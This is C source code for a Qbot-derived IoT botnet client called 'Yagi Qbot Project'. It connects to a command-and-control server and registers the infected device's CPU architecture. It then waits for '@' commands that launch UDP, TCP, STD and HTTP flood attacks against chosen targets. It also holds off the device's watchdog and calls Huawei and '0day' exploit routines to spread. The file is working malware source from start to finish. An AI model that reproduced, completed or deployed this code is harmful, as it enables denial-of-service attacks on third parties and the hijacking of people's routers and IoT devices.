/*
 		
		
  		Title: Yagi Qbot Project
		Created 03/10/18
		Build: 1.0 Official
		
		- arch register
		- custom command trigger
		- 0day exploiter
		- huawei exploiter

		udp - udp flood from org qbot
		tcp - tcp flood from org qbot
		std - std from kaiten irc bot
		http - blj's http flood
		kill/stop - kills all running attacks
		killc2proc - kills bot proc on all devices that are infected
  
*/
 
#include <stdarg.h>
#include <pthread.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "headers/cnc.h"
#include "headers/huawei.h"
#include "headers/exploit.h"
#include "headers/attacks.h"
#include "headers/util.h"
#include "headers/table.h"

// Bot Settings //

int retry = 1;
int retrys = 3;
int tryagain = 1; 
int max_attacks = 4; 
int maxboot_time = 600;
char *trigger = "@"; 
#define MAX_PARAMS 10

////////////
int buffer;
int C2 = -1;
int ioctl_pid = 0;
char buf[1024];
char pongresponse[25];
struct sockaddr_in Socket;
////////////

// Defined Arch //

#ifdef MIPS
#define BOT_BUILD "mips"
#elif MPSL || MIPSEL
#define BOT_BUILD "mpsl"
#elif SPARC || SPC
#define BOT_BUILD "spc"
#elif SH4
#define BOT_BUILD "sh4"
#elif X86 || X86_32 || X86_64
#define BOT_BUILD "x86"
#elif ARM || ARM4 || ARM5
#define BOT_BUILD "arm4"
#elif ARM6 || ARM7
#define BOT_BUILD "arm7"
#elif PPC || POWERPC
#define BOT_BUILD "ppc"
#elif M68K
#define BOT_BUILD "m68k"
#else
#define BOT_BUILD "unknown"
#endif

void registerme(char *arch)
{
	char registermsg[100];
	snprintf(registermsg, sizeof(registermsg), "arch yagi.%s\r\n", arch);
	if(write(C2, registermsg, strlen(registermsg)))
	{
#ifdef DEBUG
		printf("Successfully registered [yagi.%s]\n", arch);
#endif
		return;
	}
	else
	{
#ifdef DEBUG
		printf("Failed to register!\n");
#endif
		return;
	}
}

int resolve_http()
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
         
    if ((he = gethostbyname(c2_http_host)) == NULL) 
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
 
    addr_list = (struct in_addr **) he->h_addr_list;
     
    for(i = 0; addr_list[i] != NULL; i++) 
    {
        //Return the first one;
        strcpy(c2_host, inet_ntoa(*addr_list[i]));
        return 0;
    }
     
    return 1;
}

void watchdog_maintain(void)
{
	int wfd[7] = {0};
	int one = 1;
	int found = FALSE;
	
	table_unlock_val(TABLE_MISC_DOG);
	table_unlock_val(TABLE_MISC_DOG1);
	table_unlock_val(TABLE_MISC_DOG2);
	table_unlock_val(TABLE_MISC_DOG3);
	table_unlock_val(TABLE_MISC_DOG4);
	table_unlock_val(TABLE_MISC_DOG5);
	table_unlock_val(TABLE_MISC_DOG6);
if ((wfd[0] = open(table_retrieve_val(TABLE_MISC_DOG, NULL), 2)) != -1 ||
    (wfd[1] = open(table_retrieve_val(TABLE_MISC_DOG1, NULL), 2)) != -1 ||
    (wfd[2] = open(table_retrieve_val(TABLE_MISC_DOG2, NULL), 2)) != -1 ||
	(wfd[3] = open(table_retrieve_val(TABLE_MISC_DOG3, NULL), 2)) != -1 ||
	(wfd[4] = open(table_retrieve_val(TABLE_MISC_DOG4, NULL), 2)) != -1 ||
	(wfd[5] = open(table_retrieve_val(TABLE_MISC_DOG5, NULL), 2)) != -1 ||
    (wfd[6] = open(table_retrieve_val(TABLE_MISC_DOG6, NULL), 2)) != -1)
    {
		found = TRUE;
        ioctl(wfd[0], 0x80045704, &one);
		ioctl(wfd[1], 0x80045704, &one);
		ioctl(wfd[2], 0x80045704, &one);
		ioctl(wfd[3], 0x80045704, &one);
		ioctl(wfd[4], 0x80045704, &one);
		ioctl(wfd[5], 0x80045704, &one);
		ioctl(wfd[6], 0x80045704, &one);
    }
	if(found)
    {
        while(TRUE)
        {
            ioctl(wfd[0], 0x80045705, 0);
			ioctl(wfd[1], 0x80045705, 0);
			ioctl(wfd[2], 0x80045705, 0);
			ioctl(wfd[3], 0x80045705, 0);
			ioctl(wfd[4], 0x80045705, 0);
			ioctl(wfd[5], 0x80045705, 0);
			ioctl(wfd[6], 0x80045705, 0);
            sleep(3);
        }
    }
	table_lock_val(TABLE_MISC_DOG);
	table_lock_val(TABLE_MISC_DOG1);
	table_lock_val(TABLE_MISC_DOG2);
	table_lock_val(TABLE_MISC_DOG3);
	table_lock_val(TABLE_MISC_DOG4);
	table_lock_val(TABLE_MISC_DOG5);
	table_lock_val(TABLE_MISC_DOG6);
}

void proc_cmd(int argc, unsigned char **argv)
{
	if(strstr(argv[0], "kill") || strstr(argv[0], "stop") || strstr(argv[0], "killattk") || strstr(argv[0], "kt")) 
	{ 
		stop_attack(); 
	}
	
	if(strstr(argv[0], "udp") || strstr(argv[0], "udpflood"))
	{
		if(argc < 5 || argc > 5)
		{
			#ifdef DEBUG
			printf("Usage: @udp <target> <port> <time> <packetsize>\n");
			#endif
			return;
		}
		if(listFork()) return;
		udpflood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
	}
	
	if(strstr(argv[0], "tcp") || strstr(argv[0], "tcpflood"))
	{
		if(argc < 6 || argc > 6)
		{
			#ifdef DEBUG
			printf("Usage: @tcp <target> <port> <time> <packetsize> <flag(s)>\n");
			#endif	
			return;
		}
		if(listFork()) return;
		tcpflood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), argv[5]);
	}
	
	if(strstr(argv[0], "std") || strstr(argv[0], "stdflood"))
	{
		if(argc < 5 || argc > 5)
		{
			#ifdef DEBUG
			printf("Usage: @std <target> <port> <time> <packetsize>\n");
			#endif
			return;
		}
		if(listFork()) return;
		stdflood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
	}
	
	if(strstr(argv[0], "http") || strstr(argv[0], "httpflood"))
	{
		if (argc < 7 || argc > 7)
		{
			#ifdef DEBUG
			printf("Usage: @http <method> <target> <port> <path> <time> <threads>\n");
			#endif
			return;
		}
		if(listFork()) return;
		httpflood(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
	}
	
	/*if(strstr(argv[0], "c2") || strstr(argv[0], "c2flood"))
	{
		if(argc < 5 || argc > 5)
		{
			return;
		}
		if(listFork()) return;
		c2flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
	}*/
}

void parse_buffer(char *buf)
{
	int i, argc = 0;
    unsigned char *argv[MAX_PARAMS + 1] = { 0 };
    char *token = strtok(buf, " ");

    while (token != NULL && argc < MAX_PARAMS)
    {
        argv[argc++] = malloc(strlen(token) + 1);
        strcpy(argv[argc - 1], token);
        token = strtok(NULL, " ");
    }

    if(argc > 0)
        proc_cmd(argc, argv);

    for (i = 0; i < argc; i++)
        free(argv[i]);
}

void qbot()
{
	if (fork() > 0)
	        return;
	
    int i, argc = 0;
    char *argv[MAX_PARAMS + 1] = { 0 };
	#ifdef DEBUG
	printf("\nStarted under tty.\n");
	printf("Attempting to resolve %s ..\n", c2_http_host);
	#endif
	resolve_http();
	if(c2_host != NULL)
	{
		#ifdef DEBUG
		printf("Grabbed IPv4 address from %s\n", c2_http_host);
		#endif
	}
	else { exit(0); }
	retryme:
    fcntl(C2, F_SETFL, fcntl(C2, F_GETFL, 0) | O_NONBLOCK);
    if((C2 = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
		#ifdef DEBUG
		printf("Failed to call socket(), error: %s\n", strerror(errno));
		#endif
		close(C2);
		close(0);
    }
	#ifdef DEBUG
    printf("[%d] Attempting to connect to C2 (%s:%d) ..\n", retry, c2_host, c2_bot_port);
	#endif
	Socket.sin_family = AF_INET;
    Socket.sin_addr.s_addr = inet_addr(c2_host);
    Socket.sin_port = htons(c2_bot_port);
    if(connect(C2, (struct sockaddr *)&Socket, sizeof(Socket)) == -1)
    {
		if(retry == 3)
		{
			#ifdef DEBUG
			printf("Failed to connect to C2 ..\n");
			#endif
			close(C2);
			close(0);
		}
		else if(tryagain == 1)
		{
			close(C2);
			retry++;
			goto retryme;
		}
	}
	else
    {
		#ifdef DEBUG
		printf("Connected to C2 on attempt #%d.\n", retry);
		printf("Attempting to register on C2 network ..\n");
		#endif
		registerme(BOT_BUILD);
		#ifdef DEBUG
		printf("Listening for orders ..\n");
		#endif
		while(buffer = read(C2, buf, 1024))
		{
			buf[buffer] = '\0';
			if(strstr(buf, "PING")) // quick code for ping/pong like irc.
				write(C2, "PONG\r\n", 6);
			if(strstr(buf, "killc2proc")) // kill current proc
			{
				break;
			}
			if(strstr(buf, trigger))
			{
				parse_buffer(buf);
			}
		}
		close(C2);
		exit(0);
  	}
}

int main(int argc, char **argv)
{
	/*uid_t uid = getuid();
	uid_t euid = geteuid();
	if (uid <= 0 || uid != euid)
	{
		printf("Cannot be ran as a privileged user!\n");
		return 1;
	}*/
	qbot();
	table_init();
	watchdog_maintain();
	
	int randnum = rand() % 1;
	
	if(randnum == 0)
	{
		huawei_init();
	}
	else if(randnum == 1)
	{
		exploit_init();
	}
}
